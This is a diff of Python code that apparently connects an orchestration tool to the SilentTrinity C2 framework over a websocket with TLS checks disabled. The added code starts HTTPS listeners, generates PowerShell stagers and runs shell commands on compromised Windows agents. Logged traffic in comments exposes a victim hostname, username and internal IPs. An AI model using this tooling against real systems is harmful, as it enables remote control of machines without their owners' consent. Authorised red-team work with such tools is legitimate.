@@ -20,7 +20,6 @@ from base64 import b64encode
 from asgiref.sync import async_to_sync
 from asgiref.sync import sync_to_async
 
-import  base64
 from base64 import b64encode
 import websockets
 from websockets import Headers
@@ -29,7 +28,9 @@ from hashlib import sha512
 import ssl
 from urllib.parse import urlparse
 import logging
-import signal 
+# import signal 
+# signal.signal(signal.SIGINT, self.exit_gracefully)
+# signal.signal(signal.SIGTERM, self.exit_gracefully)
 
 logger = logging.getLogger(__name__)
 
@@ -37,19 +38,38 @@ logger = logging.getLogger(__name__)
 def gen_random_string(length: int = 10):
     return ''.join([random.choice(string.ascii_letters + string.digits) for n in range(length)])
 
-async def recv_(ws):
-    response = await ws.recv()
-    logging.info("Response: %r", repr(response))
+from functools import cache
 
 class ConnectionHandler():
-    async def connect(self, url, head, ssl_context):
-        self.ws = websockets.connect(
-            url, 
-            extra_headers=head, 
-            ssl=ssl_context, 
+
+    def generate_auth_header(self, username, password):
+        client_digest = hmac.new(password.encode(), msg=b'silenttrinity', digestmod=sha512).hexdigest()
+        header_value = b64encode(f"{username}:{client_digest}".encode()).decode()
+        return Headers({'Authorization': header_value})
+
+    @cache
+    def __init__(self, username,password,teamserver_url):
+        # head = await sync_to_async(self.generate_auth_header)(username, password)
+        self.head = self.generate_auth_header(username, password)
+        logger.debug("head : %r", self.head)
+
+        self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+        self.ssl_context.check_hostname = False
+        self.ssl_context.verify_mode = ssl.CERT_NONE
+
+        URL = urlparse(teamserver_url)
+        self.url = f"{URL.scheme}://{URL.hostname}:{URL.port}"
+
+    async def connect(self):
+        self.ws = await websockets.connect(
+            self.url, 
+            extra_headers=self.head, 
+            ssl=self.ssl_context, 
             ping_interval=None,
             ping_timeout=None
         )
+        logger.error('self.ws: %r', self.ws)
+        return True
         # async with websockets.connect(
         #     url, 
         #     extra_headers=head, 
@@ -62,10 +82,22 @@ class ConnectionHandler():
         #     self.ws = ws
         #     self.msg_queue =  asyncio.Queue(maxsize=1)
         #     asyncio.gather(self.data_handler)
-    async def data_handler(self):
-        pass
+
+    async def send(self, payload):
+        if not hasattr(self, 'ws'):
+            await self.connect()
+        logger.error('[*]-> send: %r', payload)
+        await self.ws.send(json.dumps(payload))
+
+    async def recv(self):
+        response = await self.ws.recv()
+        logger.error('[*]<- resposne:%r',response)
+        return json.loads(response)
+
     async def close_connection(self):
-        pass
+        if  hasattr(self, 'ws'):
+            self.ws.close()
+
 
 
 class SilentTriC2(C2):
@@ -96,27 +128,43 @@ class SilentTriC2(C2):
         ),
     ]
 
-    def __init__(self, *args, **kwargs) -> None:
-        super().__init__(*args, **kwargs)
-        self._token: Optional[str] = None
-        # self._listener_types = {
-        #     SilentTriHTTPListenerType.name: SilentTriHTTPListenerType(
-        #         self.options['url'],
-        #         self
-        #     ),
-        # }
-        # self._launcher_types = {
-        #     SilentTriPowershellLauncherType.name: SilentTriPowershellLauncherType(self.options['url'], self),
-        # }
+    def __init__(self, options, *args, **kwargs) -> None:
+        super().__init__(options, *args, **kwargs)
+        self._listener_types = {
+            SilentTriHTTPListenerType.name: SilentTriHTTPListenerType(
+                self.options['teamserver_url'],
+                self
+            ),
+        }
+        self._launcher_types = {
+            SilentTriPowershellLauncherType.name: SilentTriPowershellLauncherType(self.options['teamserver_url'], self),
+        }
 
-        # self._agent_types = {
-        #     'powershell': PowershellAgentType(self.options['url'], self),
-        # }
+        self._agent_types = {
+            'powershell': PowershellAgentType(self.options['teamserver_url'], self),
+        }
 
-    def generate_auth_header(self, username, password):
-        client_digest = hmac.new(password.encode(), msg=b'silenttrinity', digestmod=sha512).hexdigest()
-        header_value = b64encode(f"{username}:{client_digest}".encode()).decode()
-        return Headers({'Authorization': header_value})
+        username = options.get('username')
+        password = options.get('password')
+        teamserver_url = options.get('teamserver_url')
+        self.connection = ConnectionHandler(
+            username,
+            password,
+            teamserver_url
+            )
+
+        # try:
+        #     self.ws = async_to_sync(websockets.connect)(
+        #         url, 
+        #         extra_headers=head, 
+        #         ssl=ssl_context, 
+        #         ping_interval=None,
+        #         ping_timeout=None
+        #     )
+        # except Exception as e:
+        #     logger.error(repr(e),stack_info=True)
+        #     self.ws = None
+
 
     async def is_alive(self, requestDto: RequestDto) -> ResponseDto:
         """
@@ -124,33 +172,12 @@ class SilentTriC2(C2):
             raises ConectionError in case of not be able to connect to c2 instance
             raises ConnectionRefusedError in case of not be able to authenticate
         """
-        username = requestDto.c2.options.get('username')
-        password = requestDto.c2.options.get('password')
-        teamserver_url = requestDto.c2.options.get('teamserver_url')
+        
 
-        # head = await sync_to_async(self.generate_auth_header)(username, password)
-        head = self.generate_auth_header(username, password)
-        logger.debug("head : %r", head)
-
-        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-        ssl_context.check_hostname = False
-        ssl_context.verify_mode = ssl.CERT_NONE
-
-        URL = urlparse(teamserver_url)
-        url = f"{URL.scheme}://{URL.hostname}:{URL.port}"
-        # self.connection = await ConnectionHandler.connect(url,head,ssl_context)
-
-        self.ws = websockets.connect(
-            url, 
-            extra_headers=head, 
-            ssl=ssl_context, 
-            ping_interval=None,
-            ping_timeout=None
-        )
-        signal.signal(signal.SIGINT, self.exit_gracefully)
-        signal.signal(signal.SIGTERM, self.exit_gracefully)
-
-        return ResponseDto(successful_transaction=True)
+        if await self.connection.connect():
+            return ResponseDto(successful_transaction=True)
+        else:
+            return ResponseDto(successful_transaction=False)
 
 
     def exit_gracefully(self, *args):
@@ -170,11 +197,11 @@ class SilentTriC2(C2):
         # <--- {"type": "message", "id": "i8Qz3wVLUt", "ctx": "sessions", "name": "list", "status": "success", "result": {"b0c71f5e-660b-4f93-b722-9df523b4b063": {"guid": "b0c71f5e-660b-4f93-b722-9df523b4b063", "alias": "b0c71f5e-660b-4f93-b722-9df523b4b063", "address": "192.168.0.117", "info": {"OsReleaseId": "2009", "Jobs": 1, "Sleep": 5000, "Guid": "b0c71f5e-660b-4f93-b722-9df523b4b063", "ProcessId": 7236, "Os": "Microsoft Windows 10 Home 10.0.19043.0", "DotNetVersion": "4.0.30319.42000", "Hostname": "DESKTOP-2LD29PJ", "MinJitter": 0, "HighIntegrity": false, "Debug": true, "MaxJitter": 0, "ProcessName": "powershell", "NetworkAddresses": ["192.168.0.117", "169.254.51.246"], "Domain": "DESKTOP-2LD29PJ", "OsArch": "x64", "Username": "criso", "C2Channels": ["https"], "CallBackUrls": [["https://192.168.0.173:8899"]]}, "lastcheckin": 2.287958860397339}}}
 
         set_ctx = {"id": gen_random_string(), "ctx": "sessions", "cmd": "get_selected", "args": {}, "data": {}}
-        await self.ws.send(json.dumps(set_ctx))
-        await recv_(self.ws)
+        await self.connection.send(set_ctx)
+        await self.connection.recv()
         cmd_list = {"id": gen_random_string(), "ctx": "sessions", "cmd": "list", "args": {}, "data": {}} 
-        await self.ws.send(json.dumps(cmd_list))
-        response = await recv_(self.ws)
+        await self.connection.send(cmd_list)
+        response = await self.connection.recv()
         agents = response['results']
         agents = []
         for agent_id in agents:
@@ -184,7 +211,7 @@ class SilentTriC2(C2):
                 active=True,
                 listener_internal_id=1,
                 agent_shell_type='powershell',
-                username='criso'
+                username=''
             )
             agents.append(_agent)
         dto = ResponseDto(
@@ -205,7 +232,7 @@ class SilentTriHTTPListenerType(ListenerType):
             required=True
         ),
         OptionDesc(
-            name='bindIp'
+            name='bindIp',
             description='interfaces to which the listener is bind',
             example='0.0.0.0',
             field_type='string',
@@ -220,24 +247,22 @@ class SilentTriHTTPListenerType(ListenerType):
     async def create_listener(self, options: Options, dto: RequestDto) -> Dict:
         _bindPort = options.get('bindPort', 8080)
         _bindIp = options.get('bindIp','0.0.0.0')
-        ws = self._c2.ws
-        await recv_(ws)
-        await recv_(ws)
+        connection = self._c2.connection
         set_listeners = {"id": gen_random_string(), "ctx": "listeners", "cmd": "get_selected", "args": {}, "data": {}}
-        await ws.send(json.dumps(set_listeners))
-        await recv_(ws)
+        await connection.send(set_listeners)
+        await connection.recv()
 
         set_https = {"id": gen_random_string(), "ctx": "listeners", "cmd": "use", "args": {"name": "https"}, "data": {}}
-        await ws.send(json.dumps(set_https))
-        await recv_(ws)
+        await connection.send(set_https)
+        await connection.recv()
 
         set_port = {"id": gen_random_string(), "ctx": "listeners", "cmd": "set", "args": {"name": "Port", "value": str(_bindPort)}, "data": {}}
-        await ws.send(json.dumps(set_port))
-        await recv_(ws)
+        await connection.send(set_port)
+        await connection.recv()
 
         set_iface = {"id": gen_random_string(), "ctx": "listeners", "cmd": "set", "args": {"name": "BindIP", "value": _bindIp}, "data": {}}
-        await ws.send(json.dumps(set_iface))
-        await recv_(ws)
+        await connection.send(set_iface)
+        await connection.recv()
 
         set_start = {"id": gen_random_string(), "ctx": "listeners", "cmd": "start", "args": {}, "data": {}}
 
@@ -245,12 +270,26 @@ class SilentTriHTTPListenerType(ListenerType):
         # <--- {"type": "message", "id": "PqFOfFolzu", "ctx": "listeners", "name": "start", "status": "success", "result": {"name": "https", "author": "@byt3bl33d3r", "description": "HTTPS listener", "running": true, "options": {"Name": {"Description": "Name for the listener.", "Required": true, "Value": "https"}, "BindIP": {"Description": "The IPv4/IPv6 address to bind to.", "Required": true, "Value": "127.0.0.1"}, "Port": {"Description": "Port for the listener.", "Required": true, "Value": "4455"}, "Cert": {"Description": "SSL Certificate file", "Required": false, "Value": "~/.st/cert.pem"}, "Key": {"Description": "SSL Key file", "Required": false, "Value": "~/.st/key.pem"}, "RegenCert": {"Description": "Regenerate TLS cert", "Required": false, "Value": false}, "CallBackURls": {"Description": "Additional C2 Callback URLs (comma seperated)", "Required": false, "Value": ""}, "Comms": {"Description": "C2 Comms to use", "Required": true, "Value": "https"}}}}
         # <--- {"type": "event", "name": "STATS_UPDATE", "data": {"listeners": {"https": {"name": "https", "author": "@byt3bl33d3r", "description": "HTTPS listener", "running": true, "options": {"Name": {"Description": "Name for the listener.", "Required": true, "Value": "https"}, "BindIP": {"Description": "The IPv4/IPv6 address to bind to.", "Required": true, "Value": "127.0.0.1"}, "Port": {"Description": "Port for the listener.", "Required": true, "Value": "4455"}, "Cert": {"Description": "SSL Certificate file", "Required": false, "Value": "~/.st/cert.pem"}, "Key": {"Description": "SSL Key file", "Required": false, "Value": "~/.st/key.pem"}, "RegenCert": {"Description": "Regenerate TLS cert", "Required": false, "Value": false}, "CallBackURls": {"Description": "Additional C2 Callback URLs (comma seperated)", "Required": false, "Value": ""}, "Comms": {"Description": "C2 Comms to use", "Required": true, "Value": "https"}}}}, "sessions": {"b0c71f5e-660b-4f93-b722-9df523b4b063": {"guid": "b0c71f5e-660b-4f93-b722-9df523b4b063", "alias": "b0c71f5e-660b-4f93-b722-9df523b4b063", "address": "192.168.0.117", "info": {"OsReleaseId": "2009", "Jobs": 1, "Sleep": 5000, "Guid": "b0c71f5e-660b-4f93-b722-9df523b4b063", "ProcessId": 7236, "Os": "Microsoft Windows 10 Home 10.0.19043.0", "DotNetVersion": "4.0.30319.42000", "Hostname": "DESKTOP-2LD29PJ", "MinJitter": 0, "HighIntegrity": false, "Debug": true, "MaxJitter": 0, "ProcessName": "powershell", "NetworkAddresses": ["192.168.0.117", "169.254.51.246"], "Domain": "DESKTOP-2LD29PJ", "OsArch": "x64", "Username": "criso", "C2Channels": ["https"], "CallBackUrls": [["https://192.168.0.173:8899"]]}, "lastcheckin": 23195.3134829998}}, "modules": {"loaded": 78}, "stagers": {"loaded": 9}, "users": {"pucara": {"name": "pucara", "ip": "127.0.0.1", "port": 46398}}, "ips": ["192.168.0.173"]}}
 
-        await ws.send(json.dumps(set_start))
-        response = await recv_(ws)
+        await connection.send(set_start)
+        # await ws.send(json.dumps(set_start))
+        await  connection.recv()
+        # logger.error('response1: %r',response1)
+
+        # response = await  connection.recv()
+        # logger.error('-->response: %r',response)
+
+        await  connection.recv()
+        # logger.error('response2: %r',response2)
+
+        response = await  connection.recv()
+        logger.error('response: %r',response)
+
         result = response.get('result')
 
-        launcher = CreateListenerDto(
+        logger.error('result: %r',result)
+        listener = CreateListenerDto(
             listener_internal_id=result['name'],
+            listener_options=options
             )
         dto = ResponseDto(
             successful_transaction=True,
@@ -301,20 +340,22 @@ class SilentTriPowershellLauncherType(LauncherType):
         # ---> {"id": "4hM4EksY4b", "ctx": "stagers", "cmd": "generate", "args": {"listener_name": "https"}, "data": {}}                                                                                             
         # <--- {"type": "message", "id": "4hM4EksY4b", "ctx": "stagers", "name": "generate", "status": "success", "result": {"output": "function Invoke-L..... ", "suggestions": "", "extension": "ps1"}}
 
-        ws = self._c2.ws
+        connection = self._c2.connection
 
         set_ctx = {"id": gen_random_string(), "ctx": "stagers", "cmd": "get_selected", "args": {}, "data": {}}
-        await ws.send(json.dumps(set_ctx))
-        await recv_(ws)
+        await connection.send(set_ctx)
+        await connection.recv()
 
         set_powershell_stagless = {"id": gen_random_string(), "ctx": "stagers", "cmd": "use", "args": {"name": "powershell_stageless"}, "data": {}}
-        await ws.send(json.dumps(set_powershell_stagless))
-        await recv_(ws)
+        await connection.send(set_powershell_stagless)
+        await connection.recv()
 
         listener_name = RequestDto.listener.listener_internal_id
         set_generate = {"id": gen_random_string(), "ctx": "stagers", "cmd": "generate", "args": {"listener_name": listener_name}, "data": {}}
-        await ws.send(json.dumps(set_generate))
-        response = await recv_(ws)
+        await connection.send(set_generate)
+        response = await connection.recv()
+        # await ws.send(json.dumps(set_generate))
+        # response = await recv_(ws)
         result = response.get('result')
 
         launcher = CreateLauncherDto(
@@ -354,19 +395,25 @@ class PowershellAgentType(AgentType):
         # [*] Path: C:\WINDOWS\System32 Command: whoami Args: 
         # desktop-2ld29pj\criso
 
-        ws = self._c2.ws
+        connection = self._c2.connection
 
         set_ctx = {"id": gen_random_string(), "ctx": "modules", "cmd": "use", "args": {"name": "boo/shell"}, "data": {}}
-        await ws.send(json.dumps(set_ctx))
-        await recv_(ws)
+        await connection.send(set_ctx)
+        await connection.recv()
+        # await ws.send(json.dumps(set_ctx))
+        # await recv_(ws)
         
-        set_ctx = {"id": gen_random_string(), "ctx": "modules", "cmd": "set", "args": {"name": "command", "value": command}, "data": {}}
-        await ws.send(json.dumps(set_ctx))
-        await recv_(ws)
+        set_cmd = {"id": gen_random_string(), "ctx": "modules", "cmd": "set", "args": {"name": "command", "value": command}, "data": {}}
+        await connection.send(set_cmd)
+        await connection.recv()
+        # await ws.send(json.dumps(set_ctx))
+        # await recv_(ws)
 
-        set_ctx = {"id": gen_random_string(), "ctx": "modules", "cmd": "run", "args": {"guids": [shell_dto.agent_internal_id]}, "data": {}}
-        await ws.send(json.dumps(set_ctx))
-        response = await recv_(ws)
+        set_run = {"id": gen_random_string(), "ctx": "modules", "cmd": "run", "args": {"guids": [shell_dto.agent_internal_id]}, "data": {}}
+        await connection.send(set_run)
+        response = await connection.recv()
+        # await ws.send(json.dumps(set_ctx))
+        # response = await recv_(ws)
         result = response['result']
         response_dto = {'content': result['output']}
         return response_dto
